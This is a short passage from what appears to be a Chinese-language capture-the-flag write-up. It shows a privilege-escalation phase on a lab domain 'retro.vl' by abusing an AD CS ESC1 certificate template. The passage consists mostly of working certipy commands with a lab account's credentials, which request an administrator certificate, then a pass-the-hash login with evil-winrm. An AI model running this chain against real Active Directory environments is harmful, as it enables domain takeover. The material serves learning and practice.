Phase 3

权限提升：ADCS ESC1

$ certipy find -u 'banking$'@retro.vl -p 'kavi123!' -dc-ip 10.129.234.44 -stdout -vulnerable
Template Name: RetroClients
Enrollee Supplies Subject: True
Minimum Key Size: 4096
🧒 儿童版 — 填假名办身份证证书模板允许申请者自定义主题身份——你写上"Administrator"，CA 不核实就签发了。
$ certipy req -u 'banking$'@retro.vl -p 'kavi123!' \
  -ca retro-DC-CA -template RetroClients \
  -upn administrator@retro.vl -dc-ip 10.129.234.44 -key-size 4096
[*] Saved certificate to 'administrator.pfx'

$ certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc-ip 10.129.234.44

$ evil-winrm -i 10.129.234.44 -u Administrator -H 'NTLM_HASH'
